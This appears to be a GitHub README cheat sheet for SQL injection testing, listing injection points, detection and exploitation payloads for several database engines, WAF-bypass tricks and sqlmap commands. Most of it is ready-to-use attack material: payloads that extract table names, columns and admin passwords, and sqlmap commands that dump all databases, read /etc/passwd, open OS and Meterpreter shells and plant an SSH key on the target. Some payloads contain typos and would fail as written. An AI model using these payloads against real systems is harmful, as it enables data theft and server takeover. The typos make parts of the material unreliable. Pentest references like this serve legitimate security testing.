# SQL Injection

- [Types](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#types-of-sql-injection)
- [Injection Points](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#sql-injection-points)
- [Detection](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#detecting-sql-injection)
- [Exploitation](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#exploitation)
- [WAF Bypasses](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#waf-bypasses)
- [SQLMAP](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Cheat_Sheet/SQL%20Injection/Readme.md#sqlmap)
---
### Types of SQL Injection

* In Band SQL Injection
* Blind SQL Injection
* OutOfBand Injection

### SQL Injection Points

- **`Login Form`**
- **`Url Search Parameters`**
- **`Url id values`**
- **`Cookie Values`**
- **`XML encoded values like <storeId>**</storeId>`**
- **`Form Input Sections`**
- **`File Upload Sections`**

## Detecting SQL Injection

*  Error Based

        '
        "
        ;
        ;--
        ;#
        `
        ')
        ")
        `)
        '))
        "))
        `))

* Union Based

      ' union select 1,2,3,4;-- -
      ' order by 1,2,3,4;-- -
      ' union select null,null,null,null;-- -
* Boolean Based

      ' and true;-- -
      ' and false;-- -
      ' and 1=1;-- -
      ' and 1=2; -- -
      ' or 1=1; -- -
      ' or 1+2 = 3;-- - 
      ' and 'a' is not 'b
      ' or '1' = '1
* Time Based

  * MySQL
    
        '; select sleep 10;-- -
        ' and sllep 10; -- -
        ' && sleep 10; -- -
        ' | sleep 10; -- -
  * PostgreSQL
    
        ' || pg_sleep(10);-- -
        '; select pg_sleep(10);-- -
  * Oracle
        
        1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
        1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
  * MSSQL

        ' waitfor_delay '0.0.10
  * SQLite

        1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
        1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

## Exploitation

#### In-Band SQL Injection

- Union Based Attack
```sql
' UNION SELECT 1,2,3,4;-- -
```
```sql
' union select 1,2,group_concat(schema_name),4 from information_schema.tables;-- -
```
```sql
' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=<database_name>
```
```sql
' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = <the_table_name>
```

- Error Based Attacks
```sql
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT version()), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT @@version), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT database()), '~|~'));--
```
- Stack Based Attack
```sql
'; select group_concat(schema_name) from information_schem.tables;-- -
```

#### Boolean SQLInjection 

- Extracting database name
```sql
id  =  2'  and  length(database())  >  10;--
```
```sql
id  =  2'  and  ascii(substr(database(),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(database(),2,1)) > 100;--
```
- Extracting table names
```sql
id  =  2'  and  (length(select  table_name  from  information_schema.tables  where  table_schema = '<name of database>' limit 0,1))  >  10;--
```
```sql
id  =  2'  and  ascii(substr(((select  table_name  from  information_schema.tables  where  table_schema = '<name of database>') limit 0,1),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(((select  table_name  from  information_schema.tables  where  table_schema = '<name of database>') limit 2,1),1,1)) > 100;--
```
```sql
id  =  2'  and  ascii(substr(((select  column_name  from  information_schema.columns  where  (table_schema = '<name of database>'  and  table_name = <table name>) limit 0,1),1,1))  >  100;--
```
- Column name enumeration
```sql
id  =  2'  and  ascii(substr(((select  column_name  from  information_schema.columns  where  (table_schema = '<name of database>'  and  table_name = <table name>  and  column_name  !=  <one of the column>) limit 0,1),1,1)) > 100;--
```
- Data Extract
```sql
id  =  2' and  length((select  column_name_here  from  <table name>) limit 0,1)  >  10;--
```
```sql
id  =  2' and  ascii(substr(((select column_name_here  from  <table name>) limit 0,1),1,1)) > 100;--
```
- Admin password extract
```sql
id=1' and (select username from tabke_name_here where username = 'admin') = 'admin';-- -
id=1' and (select username from table_name_here where username = 'admin' and (length(password) > 10)) = 'admin';-- -
id=1' and (select username from table_name_here where username = 'admin' and (ascii(substr(select password from table_name_here where usrename = 'admin')1,1) > 100) = 'admin';-- -
```
#### Time Based Injection
- Functions to be used

        sleep(10)
        pg_sleep(10)
        waitfor delay '0.0.10'
        benchmark()
- General Syntax
```sql
hvdhjv’; select case 
when (1=1) then pg_sleep(10) 
else pg_sleep(0) 
end ;
```
- Table Name Enumeration
```sql
hvdhjv’; select case 
when ((ascii(substring(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>10) 
then pg_sleep(10) 
else pg_sleep(0) 
end ;
```
- Column Name Enumeration
```sql
hvdhjv’; select case when ((ascii(substring(select column_name from information_schema.columns where table_name=<table_name> limit 1),1,1))>10) then pg_sleep(10) else pg_sleep(0) end ;
```
- Username and Password
```sql
hvdhjv’; select case when ((ascii(substring(select username from <table_name> limit 0,1),1,1))>10) then pg_sleep(10) else pg_sleep(0) end ;
```
- Admin password enumeration
```sql
xyz'|| (case when (substr((select password from users where username='administrator'),1,1) = 'a') then pg_sleep(10) else pg_sleep(0) end) || '
```
```sql
hvdhjv’; select when ((ascii(substring(select password from <table_name> where username='admin'),1,1))>100) then pg_sleep(10) else pg_sleep(0) end ;
```


## WAF Bypasses

- Avoiding the White Space
```sql
'/**/or/**/1=1;--

'%09or%091=1;--

'%0Aor%0A1=1;--

'%0Bor%0B1=1;--

'%A0and%A01=1;--
```
- Parenthesis
```sql
id=(1)or(1)=(1)
```
- No Comma allowed
```sql
LIMIT 0,1  ==>  LIMIT 0 OFFSET 1

SUBSTRING('hello world', 1, 1)  ==>  SUBSTRING('hello world' FROM 1 FOR 1)

SELECT 1,2,3,4  ==>	UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
- Others
```
'ad'||'min'  is equal to 'admin'
```
```
in the place of  '1' = '1'  you can use  'a'  is not  'b'
```

## SQLMAP 

* Risk and Level

  * Three stages of risk, e.g. `--risk 2`
  * Five stages of level, e.g. `--level 4`
* Technique
  
  * We can specify the techniques using `--technique=EUBST`
  * E => Error Based
  * U => Union Based
  * B => Boolean Based
  * S => Stacked Querires
  * T => Time Based
* Cheatsheet
```bash
-SQLMAP
 |
 |1-Identifying the vulnerable injection point
 |  |sqlmap -u 'https://example.com?id=7' 
 |2-Fingerprinting the database helps to find the database type and the version of database that is used.
 |  |sqlmap -u 'url' --fingerprint
 |3-Listing all the databases
 |  |sqlmap -u 'url' --dbs
 |4-Enumerating the tables from a specific database
 |  |sqlmap -u 'url' -D 'db_name' --tables
 |5-Dumping data from column
 |  |sqlmap -u 'url' -D 'db_name' -T 'tb_name' --dump
 |6-Dumping all  databases info
 |  |sqlmap -u 'url' --dump-all
 |7-Reading a server side file
 |  |sqlmap -u 'url' --file-read=/etc/passwd
 |8-Skippping to default option and operate on full automatic mode
 |  |sqlmap -u "https://example.com" --batch 
 |9-The risk[1-3] and level[1-5], both are set to 1 by default
 |  |sqlmap -u 'url' --risk 1 --level 1
 |10-Shell
 |  |os shell
 |  |sqlmap -u "http://example.com?id=1" -p id --os-shell
 |  |Arbitary Commands
 |  |sqlmap -u "http://example.com?id=1" -p id --os-cmd="whoami"
 |  |sql shell
 |  |sqlmap -u "<url_here>" --sql-shell
 |  |Meterpreter
 |  |sqlmap -u "<url_here>" --os-pwn
 |  |SSH Shell
 |  |sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
 |11-Automated Exploit
 |  |*Caution: This method is not advised to pentest. It may delete the database files
 |  |sqlmap -u "<url_here>" --batch --forms --crawl=1 --risk=3 --level=5 --random-agent --threads=5
 |12-Proxy
 |  |sqlmap -u "<url_here>" --proxy="http://127.0.0.1:8080" --proxy-cred=<if_any>
 |13-Exploiting the database directly
 |  |sqlmap -d "mysql://username:pass@IP_HERE/database" --dump-all
 |14-Tampering
 |  |It helps to bypass different WAF
 |  |sqlmap -u "<url_here>" --tamper=space2comment  
 |  |*Tampering Scripts => https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/SQLmap/#tamper-scripts 
 |  |*Source => https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
 |  
 |-Another Method by using the captured http-request file
 |  |sqlmap -r req_file.txt -p 'tested input parameter' --technique=EUBTS
 |  |[E Error_Based / U Union_Based / B Boolean_Based / T Time_Based / S Stacked_Queries]
 |  |sqlmap -r req_file -p 'tested param' --fingerprint
 |  |sqlmap -r req_file -p 'tested param' --dbs
 |  |sqlmap -r req_file -p 'tested param' -D 'db_name' --tables
 |  |sqlmap -r req_file -p 'tested param' -D 'db_name' -T 'tb_name' --dump
 |  |sqlmap -r req_file -p 'tested param' --dump-all

```


It is an automated command line tool to check for SQL Database vulnerabilities and also helps to craft payloads.


























































































































































































































































































































































































































































































